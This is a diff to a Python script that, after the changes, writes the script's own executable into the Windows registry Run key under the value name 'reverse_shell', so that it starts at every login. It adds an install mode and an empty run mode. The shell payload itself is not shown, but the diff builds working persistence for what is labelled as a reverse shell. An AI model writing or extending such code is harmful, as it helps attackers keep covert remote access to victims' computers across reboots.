@@ -3,6 +3,7 @@
 # module to edit the windows registry
 import winreg as reg
 import os
+import sys
 
 
 def AddToRegistry():
@@ -14,21 +15,23 @@ def AddToRegistry():
     pth = os.path.dirname(os.path.realpath(__file__))
 
     # name of the python file with extension
-    s_name = "test.py"
+    base = os.path.basename(__file__)
+    filename = os.path.splitext(base)[0]
+    s_name = filename + '.exe -r'
 
     # joins the file name to end of path address
-    address = os.join(pth, s_name)
+    address = os.path.join(pth, s_name)
 
     # key we want to change is HKEY_CURRENT_USER
     # key value is Software\Microsoft\Windows\CurrentVersion\Run
-    key = HKEY_CURRENT_USER
+    key = reg.HKEY_CURRENT_USER
     key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
 
     # open the key to make changes to
     open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
 
     # modifiy the opened key
-    reg.SetValueEx(open, "any_name", 0, reg.REG_SZ, address)
+    reg.SetValueEx(open, "reverse_shell", 0, reg.REG_SZ, address)
 
     # now close the opened key
     reg.CloseKey(open)
@@ -36,4 +39,10 @@ def AddToRegistry():
 
 # Driver Code
 if __name__ == "__main__":
-    AddToRegistry()
+    arg = sys.argv[1]
+    if arg == '-i':
+        # Install mode
+        AddToRegistry()
+    elif arg == '-r':
+        # Run mode
+        pass
